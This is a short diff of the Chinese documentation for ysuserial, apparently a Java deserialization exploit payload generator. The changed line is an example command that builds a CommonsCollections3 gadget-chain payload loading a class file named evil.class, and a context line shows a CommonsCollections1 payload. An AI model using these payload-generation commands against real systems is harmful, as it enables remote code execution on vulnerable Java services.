@@ -296,7 +296,7 @@ java -jar ysuserial-<version>-su18-all.jar -g CommonsCollections1 -p 'open -a Ca
 示例：
 
 ```shell
-java -jar ysuserial-<version>-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class-org.su18.Evil
+java -jar ysuserial-<version>-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class
 ```
 
 效果图：
